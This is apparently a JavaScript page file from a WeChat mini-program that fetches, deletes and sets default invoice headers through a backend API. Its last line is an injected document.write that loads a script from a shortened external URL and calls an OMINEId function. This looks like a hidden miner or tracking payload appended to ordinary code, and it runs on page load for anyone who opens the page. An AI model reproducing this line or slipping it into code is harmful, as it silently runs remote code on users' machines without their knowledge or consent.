var t = getApp(),
  a = t.requirejs("core"),
  e = t.requirejs("biz/order"),
  $=t.requirejs("jquery");
Page({
  data: {
    icons: t.requirejs("icons"),
    status: "all",
    list: [{ ordersn: "AB4558552222", statusstr: "待付款", order_goods: [ { thumb: "urlTest", title: "ME6211C33M5G ", optiontitle: "盘装", price: "0.56", pnum: "20" ,total:"11.2" }], price: "0.66", id: "10", cancancel: "true", canpay: "true", canverify: "10", candelete: "true", cancomment2: "true", cancomment: "true", cancomplete: "true", canrefund: "true", refundtext: "just do it", hasexpress: "true", canrestore: "true" }],
    page: 1,
    code: false,
    show:"",
    loaded:false,
    cancel: e.cancelArray,
    cancelindex: 0,
    buttonText:"v",
    colors:"#fff",
    onshowData:false
  },
  onLoad: function (a) {
   
  },
  onShow:function(){
    this.get_list({ is_invoice: '1'});
  },
  get_list: function (addObject,fn) {
    //我的发票列表
    var _this = this;
    wx.showLoading({
      title: '加载中'
    });
    var datas = {};
    if (addObject) {
      datas = $.extend({
        session_token: t.globalData.session_token,      
      }, addObject);
    } else {
      datas = {
        session_token: t.globalData.session_token
      };
    };
    wx.request({
      url: t.globalData.daxin + "/customer/userInvoiceHeader",
      data: datas,
      method: "POST",
      success: function (res) {
        wx.stopPullDownRefresh();
        //console.log(res);
        wx.hideLoading();
        _this.setData({
          onshowData: true
        });
        if ( !res.data.data){
          if (res.data.statusCode >= 0){
            var title="删去成功";
            if (datas.action == "update") title = "设置成功";
            // wx.showLoading({
            //   title: title,
            //   icon:"success",
            //   duration:1000,
            //   success: function () {
            //       if(fn)fn();
            //   }
            // })
            wx.showModal({
              title: "信息提示",
              content: title,
              showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  if (fn) fn();
                }
              }
            })
          }else{
            wx.showModal({
              title: '错误提示',
              content: res.data.msg,
              showCancel: false,
              success: function (res) {
                if (res.confirm) {

                }
              }
            })
          } 
          return;
        };
        if (res.data.statusCode >= 0 && res.data.data.list) {
          var lists = res.data.data.list;
          if (res.data.data.list.length == 0)
            {
              _this.setData({
              empty:true,
              show: true
            });
            return;
          };
          $.each(lists, function (index, value) {
            
          });
          _this.setData({
            list: lists,
            colors:"#f8f8f8",
            show: true,
            loaded:true
          });
        } else {
          if (res.data.statusCode == "-400"){
            _this.setData({
              empty: true,
              colors: "#fff",
              show:true,
              list:[]
            });
          }else{
            wx.showModal({
              title: '错误提示',
              content: res.data.msg + ',数据获取失败',
              showCancel: false,
              success: function (res) {
                if (res.confirm) {

                }
              }
            })
          }
        }

      }
    })
  },
  onPullDownRefresh:function(){
     //下拉刷新 
      this.get_list(false,function(){
        wx.stopPullDownRefresh();
      });
  },
  onReachBottom: function () {
    this.data.loaded || this.data.list.length == this.data.total || this.get_list()
  },
  handle: function (t) {
    var e = this,
      s = a.pdata(t).type,
      id = a.pdata(t).data;
    switch (s) {
      case 'getOut': 
      //删去    
        e.get_list({ invoiceId: id, action: "delete" },function(){
          e.get_list({ is_invoice: '1'});     
        });break;
      case 'setDefault': 
        //设置默认
        e.get_list({
          invoiceId: id, invoice_default: 1, action:"update" }, function (res) {
               e.get_list({ is_invoice: '1' });
          }); break;
      case 'difference': e.difference({ order_sn:a.pdata(t).order_sn}); break;
      case '2': obj = { ship_status: 2 }; break;
      case '3': obj = { order_status: 3 }; break;
      case '4': obj = { is_retreat: 1 }; break;
      case '5': obj = { is_comment: 1 }; break;
      default: break;
    };
  },
  finish: function () {
    return;
    this.setData({
      code: false
    })
  },
  onShareAppMessage: function () {
    return a.onShareAppMessage()
  },
  moreHandle:function(event){
    var indd= a.pdata(event).self;
    var status = indd;
    if (this.data['buttonStatus'] == indd) { status = "-1";}; 
    this.setData({
      'buttonStatus': status,
      isTurn: status
    });
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
